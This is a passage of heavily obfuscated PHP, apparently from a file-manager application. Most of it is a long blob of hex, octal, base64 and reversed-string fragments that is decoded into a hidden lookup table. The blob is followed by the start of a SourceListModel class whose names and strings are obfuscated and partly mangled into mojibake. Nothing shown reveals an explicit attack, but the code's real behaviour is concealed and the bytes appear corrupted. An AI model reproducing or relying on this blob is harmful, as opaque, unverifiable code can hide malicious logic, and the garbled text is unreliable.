ğc»–¶Ç‚üUæÁc*').base64_decode('acUEdOZ3SEVoZCgR7HDHOWuIB/H+FeGmcLRZSg5Fy2eCExU8ksrqaKT/hJqetYTd')."\150\100\134\107\172\35\146\352\275\311\336\351\265\213\173\326\327\326\364\370\27\373\246\161\131\24\305\47\222\365\345\70\321\26\303\373\15\356\10\174\144\260\110\132\14\102\176\237"."\xf\x1a\xe1\x1f\xfe\x1e\x3f\xf7\x1\xc5\xd0\x28\xb8\xba\x8d\x53\x6f\x39\x8e\x5e\xb8\x9c\x47\x30\xab\x6c\x9f\xdb\x8b\x63\x88\x5e\x4d\x26\xe3\xab\xe2\x7c\xb6\x29\x28\x56\x4a\x77\xc0\x17\xcd\x26".strrev('n]G>QA˜âã1C°•HÚm6 ½ˆnŸ(åXl:€Fb¥X¬å;ÿ£2¸ë')."\x18\xf6\x5c\x9c\xed\xcd\x2\x3a\x76\xe0\x44\x6c\x46\xc4\x5d\x5b\x7b\xe8\xb8\xa5\xe1\x8e\x48\xb4\x73\x59\x2c\x9e\xe8\x5a\xbe\x62\xe5\xaa\xe3\x61\x76\x19\x8\x64\x14\x2f\xf3\xa7\x5\xfe\x21\xfd"."\x43\xaa\xe9\x1f\x62\x7e\x8d\x97\x63\xda\x5c\xb3\xfc\x32\xcd\xc3\x23\xd1\x18\x11\xba\x63\xc8\xca\x4f\x59\x76\x9e\x8a\x71\x83\xbf\x72\x12\xad\xcd\x9f\x2f\xd8\xf5\xe3\xe4\xe8\x34\xb5\x3e\xc3\xb0"."\307\111\135\336\361\315\25\103\142\167\217\325\313\140\316\237\326\206\374\202\132\141\50\214\163\44\160\136\173\145\377\312\30\74\145\302\53\335\347\72\174\41\102\70\37\224\216\150"."\21\71\203\51\333\255\362\346\275\351\236\104\33\166\2\331\163\74\137\153\335\224\274\60\246\214\102\132\227\314\350\325\24\243\261\112\251\1\156\263\216\261\277\345\35\326\31\64"."\115\341\154\32\350\34\45\325\24\145\133\45\175\273\101\57\346\132\274\152\256\337\100\364\126\66\317\142\325\1\107\272\360\357\131\64\162\72\363\200\66\350\105\115\110\151\64\63"."\xaa\x9c\x9d\xa1\x58\xeb\x80\xfb\x46\xc5\x1\x8b\x87\xe4\x2d\x46\x4e\x19\xae\x1a\x83\xcf\xb2\x76\xd7\x8e\xe6\x91\xdc\x73\x6b\x9c\xc\xa2\x41\x99\x5\xee\x8d\x5b\x11\xe1\x2b\xd9\x16\x32\x7\xb3"."\202\277\304\244\23\361\350\113\203\36\105\70\106\147\142\315\312\164\35\161\267\42\250\345\224\154\143\317\220\161\176\100\50\141\345\7\270\142\105\312\101\234\140\72\240\125\322\325".base64_decode('EvQH+ChHaU2jTOEJ7BObRmPSEwsOZweyV/fAivgsb3tHoNmLjpQZknJrTwKd7Ayw')."\xd4\x61\x6b\x16\xe3\x37\x68\xcc\xf4\x39\x4a\x16\xad\x4\x40\x4c\xb9\x9f\xd4\x29\x4e\x9f\xc1\x34\x92\x3a\xfe\x4c\x99\x5a\x1a\xab\x9f\x30\x4a\x92\xc6\xba\x20\x89\x46\xa\x3c\x41\xc3\xd4\x73\x1b"."\x53\xd0\xca\xaa\xbc\xc3\x78\x18\x80\xab\x2a\xb4\xbb\xb2\x62\xbb\x2b\x2b\xb5\xbb\xd2\xd5\xee\xca\xf2\x76\x69\x94\xb\x62\xd5\x62\xb1\x39\x8b\x61\xc1\x81\x4d\x1d\x51\x29\x39\xc0\x4e\xb2\xc\x56"."\257\221\225\164\100\2\112\65\157\175\50\271\205\22\325\151\236\337\22\137\174\127\144\244\375\342\250\316\7\50\77\315\16\116\213\41\261\234\152\331\313\35\156\167\276\325\133\57"."\166\30\321\301\331\40\116\273\372\15\313\362\143\247\201\204\142\347\52\146\321\70\273\343\161\216\211\152\4\111\314\70\170\57\343\256\146\271\43\132\341\255\226\212\346\351\167\220"."\x7b\x4d\x41\x8c\x47\xa0\x1f\xfb\xc1\x40\x78\xe\x66\x25\x38\x52\x34\x2c\x4d\x76\x83\x9c\xd6\x88\x13\x4b\x6e\xf8\x2d\xf9\x14\xce\xab\x23\x18\x13\x31\xcd\x3b\xc9\xbb\x30\xf3\xd5\x2b\x7b\x10\xc4"."\23\346\315\73\274\241\217\170\321\320\135\376\171\55\115\33\140\14\246\304\204\160\241\100\47\367\273\353\36\16\106\5\2\51\232\334\347\62\275\325\365\126\214\360\112\256\24\50".base64_decode('NpD8dqN+QdW4m7B/s2RumCCB/hxfadReUzhCRmtJve0v1UaZk2HXDnD5Je5p6+no')."\x49\xc8\xd3\x64\x9b\x6a\x26\x83\xba\x2d\xf9\x14\x75\xf4\x45\xb8\x41\x6\xf0\x23\xe\xf2\xd9\x64\x8c\xef\x44\x19\x2e\x2f\x8e\xad\xe8\x83\x19\x12\x9\xd7\xe1\x37\x89\x62\x9b\x67\x38\xc9\x21\x97".strrev('8i4+©¡²7Ö\\Râ¡šºêBÃxW8ÇÁxd^Ç¤–+†ĞŒŞ€xá—vQ´¼')."\x13\xd7\x56\x21\x48\xac\x6a\xa8\x9a\x52\x83\x7e\x6b\xab\x3c\x55\x98\x38\x25\x61\xbc\x8a\x38\x82\xf4\xa3\xaa\x61\x4a\xd\xf9\xa8\x5\x8f\x26\x63\x60\xe3\x20\xb9\x4f\x15\x37\xe6\x20\x4e\x58\x8c"."\xa6\x56\xba\xe6\x59\x4c\x66\x3\xef\xfd\x19\xfe\x19\xfe\x61\xc0\x7\x8b\x7\x71\x8b\xe2\xdd\x9\xf7\x19\x30\x92\x44\x68\x8f\x5d\x5f\x24\x65\xe4\xb\x68\x1d\x66\x5d\x4e\x69\xe7\x3d\x61\x68\xb9"."\243\145\66\303\242\201\216\343\275\302\241\361\302\305\43\371\234\2\234\146\143\165\275\257\256\132\141\357\222\64\126\167\45\132\275\363\252\27\57\232\274\260\231\134\372\332\132\7"."\xbe\xb5\xc5\x3e\xac\xa9\x0\x60\x11\x5c\xca\x2c\xc4\xdb\x8b\x7\xfc\xce\xd0\x78\x65\x1\xfe\xf2\xea\x98\x51\x40\x47\x1d\xc2\x50\x79\x5f\xa\x26\xb3\x8b\x63\x31\xe1\xfa\xba\xa0\xd9\xc3\x86\x9"."\67\332\200\140\147\324\315\222\141\32\100\304\142\133\233\70\63\150\300\162\114\66\374\256\342\150\251\340\305\142\10\157\134\166\161\347\162\266\137\347\314\217\5\11\316\374\62\152"."\x4c\x9\xf4\x91\x17\x9f\xf4\xe1\x84\x6\x45\x7e\x4d\x43\xf2\xe0\xeb\xc5\x34\x1\xdd\x95\x4c\xa6\x5\x71\x18\x6b\xb2\x28\xdd\xa9\x20\x2a\x50\x62\xd2\x89\x12\x97\xb8\xfa\x8b\xa7\xda\x8b\x88\x2e"."\14\377\150\123\241\343\327\326\52\145\161\76\331\340\176\310\301\75\13\244\10\136\134\257\374\102\304\10\242\270\161\62\366\25\357\305\353\353\325\323\343\245\210\115\135\261\253\51"."\x0\x95\x4a\x59\xba\x4a\x7a\xda\xdd\x24\x51\x22\xf0\x96\x4a\xac\xc1\x8a\x95\xca\xfc\x0\xcb\x40\x6\x11\xe2\xf5\x39\x28\x73\x15\xad\x35\x27\xc6\xdd\xc4\xbd\x24\x37\x2e\xf7\xbf\x8e\x36\xaf\x32".strrev('Ñ>G!œ;äi‹Dw´9.Ãc`pŞ <0Ïí³üÉôg-2*Q¦XéŠÌ'."\r".'ùìÃfc').base64_decode('W8frIDBQyrNLjveJgJvuJKwZlOQPFVTApIgZYwcGHLuSB3e+IP3sw+T5VbFF+nID').base64_decode('YiR9WKEbIHwAddQQZBY5ciVpcipbKgw0SomKbRhKXi2MAjcw1WqYai3ADTVO9c3K')."\x58\x28\x0\xf8\x9a\x7b\x81\xc5\xe7\x88\xf0\xd1\x47\x7d\xc6\x40\xa\x15\xe7\xfb\xf0\xab\x22\x3e\x7c\x48\xc5\x4a\xcc\xb0\x8a\x8\xf3\x80\xa0\xc8\x95\xf8\x6b\x10\x45\xf2\xd\xbd\xed\xc\x77\xb5"."\x85\x22\x92\x32\x93\x14\x91\x6c\x6e\x89\x24\x3\x9d\x9d\x15\x13\xe4\x36\xfc\x58\x13\xc0\xb7\x86\x5d\x90\xa4\x18\x84\x2d\xd4\xf3\xfd\x4a\xa\x5b\x3c\x34\x56\xe1\xd8\x2a\xc5\x32\x53\xcc\x2f\x6e"."\225\37\160\52\311\40\170\251\205\72\24\251\306\105\224\14\2\31\57\371\242\311\325\213\26\372\365\105\174\342\205\267\36\323\20\6\35\76\377\61\230\263\362\143\165\241\302\261".base64_decode('eKVl7QUS2yp88yjKQlWhc9pYjXU5MtVKFp3NXFdykbtwhF0hLfSrciLeZTGDkcKc')."\xa1\x1a\xe2\x42\xfb\x8a\xb7\x11\x1\xc9\x7f\x36\x79\xdd\xa1\x59\x2d\x2c\x2f\x2f\x82\x2b\xf7\xa5\xe4\x24\xba\x92\xc4\xe4\xa4\x3c\xbf\x9f\x48\x5\xfc\x82\x77\x74\x5e\xcf\xf0\x1b\x8d\xa\x40\xe1"."\x13\xef\x30\xa9\xa9\x1\xc\x5d\xe2\x28\x80\x36\x21\xa1\x13\xb3\x2b\x34\xc1\xf1\x2e\x80\x2d\xa9\x6b\x94\xb0\xf9\x15\x11\xba\x9b\xe2\x4d\x95\xb5\x6b\x69\x45\xf8\xf4\x5f\xbf\xbe\x3c\xe\x34\x3e"."\335\111\201\242\356\216\302\220\343\216\303\354\267\210\103\147\232\263\31\12\265\162\46\21\303\362\320\137\121\46\34\151\23\1\312\236\70\22\273\231\162\65\11\365\164\127\373\246".base64_decode('rV/v15leFNPhYGV9PDcN9/ic+dFIYOp5Rohw56S05HGw+Sb7pwmTMa7/pGClqMbG').strrev('±@ïÑµüCÅÜÇ§\'DGÄø§ ròAÍŸà¬Më,–ÇŸ¯P‚1¥—§üİE').base64_decode('KAfZEzjkviGn9/n5bqd3EL6UsLRiWQiuccVj5SVXAn7ig0QPIcSIKLA17nhUF4/k').base64_decode('HwutlKkXbQeeog8EVpHXXNaoQyrNUqUAr95YRdzGVyG8RFMAIYiuLMQISDG1XGMV').base64_decode('6a6V1TRUnqCYSo2gglUKw455lc+YaRvoEOQ2P/C2UlcMzCICEbjjAfLqmBPo75Rj').base64_decode('GKCQh75ymkl1vwnWIbd+GSHfgqeeOmPRRLSZvYxTSRA2i9GyFjVSEzwPs+DhKhIs')."\x7\xa7\xe\xfc\x10\x3\xcb\x6f\x96\xa\x5\xae\x6d\x86\xc9\x45\x7e\x84\x61\xed\x95\xe4\x71\xf1\x68\x84\x3d\xd9\x91\xe0\xd0\x83\x1f\x63\xf1\x29\xdd\x2a\xbb\x94\x2\x35\x55\x7a\xcb\x16\xcf\x96"."\x6c\x71\x5c\x62\x3f\xf4\x9\x6c\xa1\x6b\x41\xb4\xe4\x6b\xf\x7b\xfa\x43\x15\x75\x53\xb9\x65\x63\x1d\x33\xd4\x60\x4a\x6c\xc2\xae\xb\x72\x56\xa8\x83\xca\x84\x13\x5c\x49\x4c\x2b\x38\xc4\x21\xb4".base64_decode('7ZzB3A/OqKur89bVo//47TCQbw3MaYGUpa6ugfxHE4hEFxbFmYJwAENekGFY06BD').strrev('Ò·e…au¯À“ÜÒ·!@¸_‘áâZ?ëDeë]ÁK^ØÍİXQ‰Bõä2p')."\354\33\21\72\150\265\311\244\100\177\271\211\37\312\46\340\150\1\265\250\154\344\235\12\26\322\335\162\143\76\66\271\64\122\270\102\366\262\4\257\374\210\1\24\242\47\204\270"."\xd3\x70\x74\xd\x95\x71\xba\x1b\xc4\x31\xe8\xa4\x4e\xf1\x71\xe2\x8\x49\x7c\x82\xa9\x36\xc9\x85\x22\xe\xca\x57\x17\x24\x99\x5b\xd4\x91\x50\x8e\x9b\xec\xe3\x60\x84\xd7\x44\xdf\xca\xa0\xef\xc"."\301\34\126\0\327\254\61\234\24\207\61\16\36\307\103\144\112\61\377\304\300\60\55\131\75\342\171\145\150\231\201\35\123\112\0\35\7\142\305\76\240\347\34\266\273\111\251\156"."\x79\x36\x17\xe0\x8c\xf2\x2c\xa1\x4d\x1b\xe0\x8f\x82\x50\x4d\x43\xd6\xbc\x2\xbb\xb\x8\x5\x7c\x56\x90\x67\xe6\xa8\x72\x68\xc3\xe4\xb2\xf5\xb3\xdd\x6b\x47\x96\xc1\x34\x84\xe5\x6d\x99\x7e\xf"."\xb\x49\x8b\xc1\x24\xe4\xf1\x6f\x51\xc1\x61\x31\x41\x16\x41\x95\x56\x9a\xb9\x83\x41\xa9\x2\x77\x92\xab\x4c\x80\xa\xd6\xcb\xa\x40\x7c\x79\x6e\x72\x19\x51\x21\x37\x8e\x77\xe5\x26\xae\x5\x9b"."\xb9\x7f\x54\xd9\xdf\x20\xd5\x16\x90\x74\x4a\x2c\xf0\x1\x2f\xd4\x3\x58\x1d\x43\x12\xf7\xe4\x2b\x9a\x46\x3f\x5a\x66\x4b\x9e\x34\x14\xdf\x59\x39\x9a\x67\x2f\xcf\x59\x21\x13\xef\xbd\x9c\x4f\x8e"."\xc4\x37\x1d\xec\xb1\x47\x80\x58\x61\xfd\xab\x8a\xb7\x66\xa5\xac\xe2\x9d\x8\x29\xd2\xb9\x61\xa5\x84\x66\xfe\x76\x8f\x1c\x89\xb9\x31\x59\x21\x84\xa8\xdc\x3a\xeb\xc0\x6c\x9e\x33\x86\xf7\xec\x1b".base64_decode('gI6x5zY8DCorHNJsAulg0Yks4E06wITBKtM/wTMk7oKd8TSOMtCO66MEwWU5jb1T')."\12\330\216\154\52\134\1\321\323\161\115\252\330\10\260\165\33\33\345\142\316\264\267\317\70\217\175\134\300\162\341\151\345\362\77\131\60\216\247\64\51\313\66\360\216\156\347\317"."\x63\x56\x0\x44\x27\xb0\x95\x41\x15\x21\x1\x70\x5\xd\x1c\xdb\x49\x21\xc4\xcc\x31\x7a\x2f\xcd\xfa\x3b\x58\xd2\x18\x8d\x2a\xa1\x46\xc5\x16\x88\x11\xd0\x58\x22\x6b\x1a\x36\xe7\x5f\x70\x7a\x20"."\x2d\xa1\xfb\xb0\x4c\xa1\x24\x68\x11\xef\x22\xd1\x8e\xe3\x1e\x4d\x72\x73\xcc\xb3\xa2\xa3\x8c\xb5\xae\xb2\xe3\x8d\x28\x85\x11\x37\xd1\x12\x4b\xe5\xa\xba\x15\xc7\xc8\x51\x64\xb3\xd3\x84\xf9\x8d"."\x2e\xf0\xd7\xa0\xf0\x72\xc6\x25\xbd\x9d\xa\x2d\x40\x21\x5e\x4\xce\x48\x53\x4b\x19\x26\xe1\xad\x25\x57\x5\x5\x3b\xa6\xf5\xcb\xc1\xb0\xc1\x65\xa\xf8\xde\x46\xab\x50\x5\xf6\xe\x23\x81\x3d"."\x86\x2\xc4\xed\x96\x64\x5f\x33\x92\x7b\x69\x14\x92\xfc\x88\x4b\xb4\x8e\xb7\x5e\xe1\x44\x52\x92\xd6\x4c\x3\xd3\xa5\x4\x92\xbf\x12\xbd\xe4\x92\x72\x49\x16\xc\x84\x99\x8f\x97\xfa\xf8\x65\x83"."\213\212\141\106\21\212\114\44\60\53\7\134\1\161\373\201\107\140\311\151\250\132\354\2\126\214\114\56\102\332\54\53\102\323\360\71\55\234\147\310\51\26\166\20\336\305\226\255"."\x52\x4a\x85\xa6\x48\x92\x34\xa3\x29\xee\x42\x8\x66\x47\x4c\x12\x24\x8c\x6a\x4c\x37\xd0\x5b\x3f\xc3\xcb\x3c\x43\xc9\x16\x13\x8c\x50\x6\x3c\x86\xf6\x82\x4\x6\x98\xa7\x60\xb8\x11\x14\xfd\x20"."\237\310\143\110\127\66\304\241\206\160\70\100\174\207\360\365\44\116\106\170\310\224\316\62\215\53\1\22\157\33\62\132\21\67\353\124\67\20\147\350\252\224\116\147\10\47\267\70"."\124\47\135\31\320\316\160\246\203\317\160\321\31\352\360\303\160\350\337\270\52\1\177\364\262\57\164\122\112\214\103\150\241\242\50\203\172\46\227\46\106\150\10\120\77\44\114\175"."\226\343\45\21\235\60\170\144\271\226\201\217\253\17\203\55\51\74\355\130\123\213\155\111\35\22\234\216\121\156\361\207\165\200\360\41\301\165\70\55\71\300\122\71\160\132\216\0"."\xd5\x79\x72\x94\xe6\x51\x3c\xd7\xb0\xc6\xcc\x42\x99\xa4\xa1\xb3\xbd\xd3\xcf\xa3\x9a\xf8\xf6\xa4\xdc\xa9\x70\x7f\xd4\xcc\x14\x8b\xc4\x33\xe9\xc3\x79\x3d\xa5\x84\xa3\x6d\xa1\xe6\x40\xb8\x25\x14"."\x5f\xaa\xf4\x6b\xb6\x22\xd4\x21\xc8\x7b\x2\xce\xad\x4c\x4\x6b\x74\xe2\x19\x54\xf7\x71\xd7\xf6\xf8\xd3\xdb\x87\x28\x56\x6f\x9a\x13\xee\x96\x20\xd1\x25\xcd\x2f\xe9\xd\x21\x67\xb5\x14\xfe\x34"."\xb3\xac\xc6\x2\xb6\xf6\xc8\x95\x95\xc1\xe2\xc2\xa\xb9\x73\x42\x7a\x26\x65\x2e\x9a\x5a\x79\xfe\x51\x8d\xbc\x73\x2e\x7a\x2c\x15\x28\x55\xe8\xd\xe4\xaf\xdc\x2\x79\x7f\x40\xce\x8d\xe\x62\xad"."\60\136\347\365\302\220\156\351\142\343\263\22\243\162\355\201\226\216\120\44\31\10\207\21\173\57\153\310\11\101\251\311\137\173\110\313\217\103\110\53\43\26\201\266\136\356\225\13".base64_decode('fBrJPrpdnDpdPtk7W5FdAcC7eNxXPA1KL70UTVW3NCmCPkAyDYwr1FzO8eZbLiMF').base64_decode('S86TtWJTSdoAi5McwFXKEMOvi/+Pu6qnhSMmPc00EbgtHHUj3yy/DMjaLHvN5lvf').base64_decode('xfGIS5MkcWrDnucyCDkOtCKNC0WT9LVd0QRiFM3Ronxr5U/7+RTTD+xvLshE1jgg')."\10\143\234\35\152\303\315\121\166\11\161\201\130\256\303\110\150\246\361\210\360\4\314\263\343\326\326\365\302\217\133\41\324\361\346\167\131\33\304\231\74\115\353\306\303\101\71\173".base64_decode('xeBQiD8NIYq6Uyp0ACUrQmzCMyiNSh19bIo7+1cWMste0QDxEBXMF20HK9kua4JL').base64_decode('a0MjCKUjWAWsT2PkR8siHLKSMOsXV8DDTx0UMoY8fwQhY7V++mQc5Vk9iNbX7PIX')."\143\150\361\377\223\202\64\61\56\251\45\72\53\51\357\220\345\76\352\4\331\205\37\303\311\32\303\316\167\343\160\214\373\371\33\307\303\67\322\246\41\6\250\362\123\75\316\102"."\236\262\47\47\24\362\64\250\202\100\35\126\21\173\55\142\74\21\311\54\65\75\225\376\364\300\57\73\316\334\235\240\210\12\232\254\345\100\325\234\325\163\151\223\53\210\210\210".strrev('xí–Ø–œ×à‹ß:vq5â³ç7·°’¥EÊğÉÃVŠòW™P‘Ö¤ª0M')."\x24\x61\x24\xd4\x7e\xf\xa5\xc8\x30\x56\x13\xa1\xa6\x51\xf9\x5b\x56\xa\x25\xa3\x40\x89\x4c\x98\x94\xe6\xeb\xbd\x48\xca\xc0\x9e\x21\x4b\x7b\xc8\x1b\x59\x14\xd5\xb9\x9f\xd1\x90\x76\x1a\xc7\x9f".base64_decode('cun+nNGn5mJUr8phBGIiborrSjqy0Si/WiyKqxf5yER/HYZykNaVaE8Sc+8kvauN').base64_decode('C5iTLm1oJFzglAohKuh2xJoSnycr9NKrKmGRBdlRPzvp3RRMmFwluy/kUtdW6als')."\177\371\375\42\326\30\3\214\42\53\124\302\125\257\117\146\304\40\203\262\120\21\240\341\330\310\30\224\20\65\354\41\37\4\123\310\204\373\67\304\162\10\166\76\321\102\101\235"."\374\264\150\31\316\305\340\260\70\315\145\37\25\102\307\300\375\312\30\153\206\77\222\346\241\43\23\217\143\322\47\321\74\374\371\63\17\165\52\350\201\107\317\74\302\262\356\233"."\136\171\21\57\340\72\237\315\305\175\346\32\210\145\354\204\233\223\340\123\345\52\20\163\117\134\302\50\227\71\212\133\325\102\51\57\356\251\121\300\311\131\225\15\130\32\141\311".base64_decode('zHnInbKHeW5zTYcYlbwyFebw2+ugiqiEXUo78VXDwj6T3cu5s+kOqEuamrAwoS4u')."\313\120\373\252\174\172\306\314\331\363\145\261\204\130\37\161\173\5\46\356\160\333\6\164\206\130\161\305\11\117\12\363\253\51\357\133\222\350\324\21\56\177\235\320\205\273\377\147".base64_decode('kC/ofppV0tgtf+W1bAYIEEq6LNJR5lJWMLAOgSW2Dz28xJuEzrbowV9hHNKJJXYC')."\x7d\x32\xce\xc8\x61\xee\x38\x8f\xa5\xbe\xb6\xa9\x3a\x59\xc1\x4a\x1c\xf\x99\x9\xc6\x5e\xe9\xe4\x25\x67\xcd\xdd\x77\x32\x31\x20\x7\x11\xc9\x12\x4b\x24\xd7\x68\x1b\x6e\x21\xe\x2e\x8e\x4f\x34".base64_decode('IkOMFnJw4GKLYbGnJJTyP1hAxt1QRkioqlQYuX8JwxsVngSU7vu/od+ULuOcnFe1')."\275\22\100\112\202\77\315\216\222\5\6\272\105\60\234\316\261\272\252\107\305\104\35\275\36\145\274\114\345\304\231\364\162\240\360\51\45\221\145\270\64\63\115\34\207\137\147\310"."\111\176\23\321\316\12\306\203\356\120\307\156\225\274\325\312\266\132\244\42\171\33\224\127\55\75\21\47\104\70\104\346\3\203\200\75\114\134\145\22\33\275\100\33\267\333\123\45"."\xf5\x22\xa7\x5c\x9\xcf\xae\xf4\x2a\xa8\x21\x7f\x8b\x59\xc7\xf8\x3c\xca\xbc\x85\xa2\xd6\x1d\x7c\x21\xa\xb7\xb8\x5e\x8c\x25\x58\xc9\xfd\x8c\x2c\x9b\x22\x82\xa\x4\x96\x93\xcc\x41\x1d\x4c\x8"."\177\106\313\301\224\130\356\227\362\20\151\46\373\361\105\101\276\11\340\70\5\164\110\164\272\151\153\322\151\51\16\106\361\65\336\123\362\316\167\346\35\126\263\330\67\222\153\347"."\63\133\134\313\365\156\46\365\305\112\277\31\231\376\177\375\64\334\377\253\27\341\146\363\107\23\34\357\316\266\1\261\314\350\263\61\311\213\63\25\331\272\306\341\74\64\47\1"."\x14\xf1\x27\x96\xa5\x30\x57\x5c\x65\xfe\xb1\x98\xdb\x2c\x95\x5d\xf3\xa8\xb9\x9c\x74\xb4\x56\x66\x2f\xca\x1e\xec\x44\xc0\x37\xc0\x5f\x7b\xac\x14\x70\x1b\x88\xb9\x1f\xef\xec\x66\xcf\x60\x93\x77"."\x39\x7b\x2b\x65\x14\x98\x87\x73\x31\x15\xe0\x98\x46\x31\xe2\xb5\x50\x7e\xd3\x89\xd7\x2b\xec\xf4\x81\x2c\x11\x19\x65\xd9\x44\xab\x88\x16\x61\xae\xc6\xfc\xec\x2b\x85\x19\x36\x4c\x89\x32\x34\x2b".strrev('ÉdÍ øõÃ¢QÛ=œñ`R#‚¬p•ü2¨DÆIXkb#¡„»ŞÌ«µŒ‹F†[')."\263\351\20\256\227\137\174\227\227\346\73\137\56\202\65\204\235\362\46\376\340\164\235\373\5\352\172\157\171\143\124\101\37\213\74\142\130\310\300\304\106\344\376\205\334\217\126\50".strrev('q¦9Û/•õO"OJd)"ğ\\±œè!šwçl¼y/á¡£èşXï*W³Œò.5!C')."\x59\xe2\x82\x4f\x37\x88\x23\x74\x56\xb4\xab\xa3\x86\xd8\x9a\x0\xc4\x22\x26\xa1\xd5\x10\x6b\x2f\xbd\x37\x8c\xf7\x94\x70\x6b\x88\x9d\x50\x11\x59\x9f\x7c\x6a\x33\xf3\x2f\x49\x7b\x1a\xa2\x1c\x12"."\71\113\176\163\302\131\22\353\303\73\367\322\242\112\331\122\206\151\111\331\170\174\245\274\30\302\144\211\203\234\206\337\206\265\35\153\41\174\332\273\175\331\23\76\234\262\326\16"."\16\33\356\140\345\50\351\212\22\21\333\151\347\343\30\44\221\104\63\17\230\120\203\164\311\346\274\343\344\276\276\313\60\145\111\17\113\311\244\24\163\254\206\176\261\211\134\110"."\370\142\40\311\364\372\40\40\75\73\354\56\345\174\256\132\272\21\115\21\310\13\226\137\172\211\273\70\211\316\140\305\60\47\44\216\0\127\174\245\7\227\63\352\220\40\222\4"."\55\236\116\363\307\320\35\131\323\214\33\341\261\50\106\274\233\216\211\54\311\352\126\50\160\153\303\356\27\150\175\262\245\256\43\143\171\254\260\312\225\312\213\353\17\61\114\34"."\127\151\370\144\243\71\213\313\126\277\34\250\104\24\175\336\200\353\17\111\174\17\66\112\20\212\105\164\50\234\211\27\115\72\155\214\171\66\276\146\50\17\61\1\361\72\142\135".base64_decode('nBwWiTCKwZVkye+8Oy86ZamCBAJaLixVJ1+CjlsgXrkRAZXOKZaMs0UCO+oMx+RL')."\50\222\17\14\162\306\344\104\107\167\334\113\113\230\20\1\276\64\62\117\4\260\64\55\340\114\242\371\65\127\357\345\2\356\221\321\22\326\260\156\247\262\22\147\124\236\130\36".base64_decode('b5ZNKjRUub/uXrE5dfOLopKy/kiaFAmjQhnao4rFaBIuKchVR9lxpgCXpUm4bFky').strrev('z•Ú7\\ÈB÷*)›Î o.f+>ofœÎ.Àa]!Ìäù^Æ²Z¶r¤W‰,+').strrev('*rß[Š±zÊ­e’Mge£>\'ZEZEÇPÚ¡W`*RË\\%@§]¹½¸ó1Q')."\134\270\342\345\211\1\277\234\100\135\1\264\41\116\61\247\263\307\14\45\225\351\251\16\374\136\52\14\24\14\176\146\244\205\276\34\126\356\345\17\321\363\266\313\152\163\302\151"."\241\44\271\72\255\250\301\355\301\174\175\71\7\235\123\231\314\136\122\175\247\54\217\141\353\51\315\351\117\125\366\331\104\323\131\43\71\111\66\350\22\313\11\51\203\103\41\240"."\202\340\212\104\1\135\47\304\337\264\76\211\142\21\60\341\60\71\240\164\2\134\11\320\333\304\146\174\153\315\357\221\210\57\120\172\256\322\344\270\141\332\36\234\226\60\212\344"."\267\311\260\155\161\273\116\331\172\102\14\342\303\321\43\51\217\240\57\161\151\204\73\105\156\43\10\330\22\364\102\76\341\136\23\363\313\161\215\246\22\244\344\10\340\133\16\36"."\220\317\76\270\337\154\55\271\156\140\105\4\142\116\373\214\21\346\151\21\233\65\213\376\210\247\355\311\224\11\372\4\300\117\126\177\41\6\343\226\237\246\370\301\103\277\127\305"."\204\42\74\271\345\133\123\354\167\24\247\17\27\161\225\316\157\252\1\244\250\242\12\352\236\233\310\272\300\66\44\236\210\227\45\165\6\342\361\25\321\130\13\365\346\135\226\114".strrev('Ì_8BÅ!=/5½xİõÉ/I:…&‹VáI"5†–\\(@ÁixÈÑíIeDêIJ')."\32\114\346\316\56\57\342\152\216\161\351\222\345\243\226\27\376\325\104\231\202\236\32\20\302\75\125\42\336\55\346\172\220\177\70\237\306\161\51\370\61\40\205\212\260\326\120\4"."\352\216\261\67\47\261\167\163\276\327\71\41\55\156\276\175\216\33\162\51\236\354\7\202\140\44\230\223\17\132\22\61\255\342\4\311\202\335\362\213\6\222\52\46\0\167\354\70".base64_decode('A1TO1hh90kUCZWPA+hCmVNIMo9+OZFvtr3hRTKV5eMcLOdv/BtT+wyBoqQAA')."".""."".""."".strrev(''), 10, -8))); goto FË¹¤«İ¨•; Cì½È¿ß: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\x65"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\x65" => "\151\x6f\x5f\x73\157\x75\x72\143\x65\x5f\x6d\x65\164\x61", "\x6d\x65\164\141\106\x69\x65\154\x64" => "\163\x6f\x75\x72\143\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\124\x69\x6d\x65", "\x74\151\155\145", "\151\156\163\145\x72\164", "\146\x75\156\143\x74\151\x6f\x6e"), array("\x63\162\145\141\x74\145\x54\151\155\x65", "\x74\x69\155\145", "\x69\x6e\163\x65\x72\x74", "\x66\165\156\x63\164\151\x6f\x6e"), array("\166\x69\x65\x77\x54\x69\155\x65", "\164\x69\155\x65", "\151\x6e\163\x65\162\164", "\x66\165\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÇãÏôÑá) { return $this->listSource(array($_SERVER[ĞÆÏ¡Îª][410] => $ÇãÏôÑá)); } public function typeName($°É×ÊË) { static $Œ¢ŞìÒµ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $Œ¢ŞìÒµ[$°É×ÊË . $_SERVER[ĞÆÏ¡Îª][12]]; } public function sourceListInfo($ÃŞîğŒÔ, $Æİ©èä = false) { $í¯œùò =& $_SERVER[ĞÆÏ¡Îª]; $ÃŞîğŒÔ = $ÃŞîğŒÔ ? $ÃŞîğŒÔ : array(); $ÃŞîğŒÔ = array_filter(array_unique($ÃŞîğŒÔ)); if (!$ÃŞîğŒÔ) { return array(); } $Í•¿‹šì = $this->where(array($í¯œùò[411] => array($í¯œùò[7], $ÃŞîğŒÔ)))->select(); $this->_listDataApply($Í•¿‹šì, $Æİ©èä); return array_to_keyvalue($Í•¿‹šì, $í¯œùò[411]); } public function pathInfoFilter(&$çÈğ×”Ô) { $¬½ºüÌ– =& $_SERVER[ĞÆÏ¡Îª]; static $ßú½·ñ = false; static $ºÅÙãÂ‘ = false; static $éòŠ•¤  = false; if (!$ßú½·ñ) { $ì£–Ù¯é = $¬½ºüÌ–[412]; $ì£–Ù¯é .= $¬½ºüÌ–[413]; $ì£–Ù¯é .= $¬½ºüÌ–[414]; $ƒ³Ì•Öö = $¬½ºüÌ–[415]; $ÎÊÙçº = explode($¬½ºüÌ–[50], $ƒ³Ì•Öö); $ßú½·ñ = explode($¬½ºüÌ–[50], $ì£–Ù¯é); $ºÅÙãÂ‘ = array(); 